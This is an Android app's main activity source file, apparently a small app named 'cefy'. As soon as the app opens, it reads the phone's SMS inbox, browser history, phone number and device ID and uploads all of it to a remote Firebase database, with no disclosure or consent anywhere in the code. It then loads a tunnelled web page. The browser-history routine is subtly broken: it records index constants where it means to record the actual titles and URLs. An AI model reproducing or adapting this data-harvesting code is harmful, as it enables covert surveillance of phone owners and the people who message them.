package com.sauravtom.cefy;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.Browser;
import android.provider.Settings;
import android.support.v7.app.ActionBarActivity;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.webkit.WebView;
import android.widget.TextView;

import com.firebase.client.Firebase;
import com.parse.Parse;
import com.parse.ParseObject;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Map;


public class MainActivity extends ActionBarActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        TextView txtView = (TextView) findViewById(R.id.text_id);

        //initialize firebase
        Firebase.setAndroidContext(this);
        Firebase myFirebaseRef = new Firebase("https://cefy.firebaseio.com/");

        //read phone SMSes
        List sms_data = getSMS();
        txtView.setText(sms_data.toString());

        //read browser history
        List browser_history = getBrowserHist();

        //get user phone number
        TelephonyManager tMgr = (TelephonyManager)this.getSystemService(Context.TELEPHONY_SERVICE);
        String mPhoneNumber = tMgr.getLine1Number();


        //generate unique device id
        String android_id = Settings.Secure.getString(this.getContentResolver(),
                Settings.Secure.ANDROID_ID);

        Firebase this_user = myFirebaseRef.child(android_id);
        Map<String, Object> user_data = new HashMap<String, Object>();
        user_data.put("phone_number", mPhoneNumber);
        user_data.put("sms_data", sms_data);
        user_data.put("browser_history", browser_history);

        this_user.updateChildren(user_data);

//        Parse.enableLocalDatastore(this);
//        Parse.initialize(this);
//        ParseObject testObject = new ParseObject("cefy");
//        testObject.put("phone_number", mPhoneNumber.toString());
//        testObject.put("sms_data", sms_data.toString());
//        testObject.put("browser_history", browser_history.toString());
//        testObject.put("foo", "barrrr");
//        testObject.saveInBackground();

        WebView myWebView = (WebView) findViewById(R.id.webview);
        myWebView.loadUrl("https://laqcnmzwud.localtunnel.me");


    }


    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.menu_main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();

        //noinspection SimplifiableIfStatement
        if (id == R.id.action_settings) {
            return true;
        }

        return super.onOptionsItemSelected(item);
    }

    public List<String> getSMS(){
        List<String> sms = new ArrayList<String>();
        Uri uriSMSURI = Uri.parse("content://sms/inbox");
        Cursor cur = getContentResolver().query(uriSMSURI, null, null, null, null);

        while (cur.moveToNext()) {
            String address = cur.getString(cur.getColumnIndex("address"));
            String body = cur.getString(cur.getColumnIndexOrThrow("body"));
            String date = cur.getString(cur.getColumnIndexOrThrow("date"));
            sms.add("Number: " + address + " .Message: " + body + " .Date: " + date);

        }
        return sms;

    }

    public List<String> getBrowserHist()  {
        List<String> browser_history = new ArrayList<String>();
        Cursor mCur = managedQuery(Browser.BOOKMARKS_URI,
                Browser.HISTORY_PROJECTION, null, null, null);
        mCur.moveToFirst();
        if (mCur.moveToFirst() && mCur.getCount() > 0) {
            while (mCur.isAfterLast() == false) {
                browser_history.add("Title: " + Browser.HISTORY_PROJECTION_TITLE_INDEX + " .Url: " + Browser.HISTORY_PROJECTION_URL_INDEX);
                mCur.moveToNext();
            }
        }
        return browser_history;
    }



}
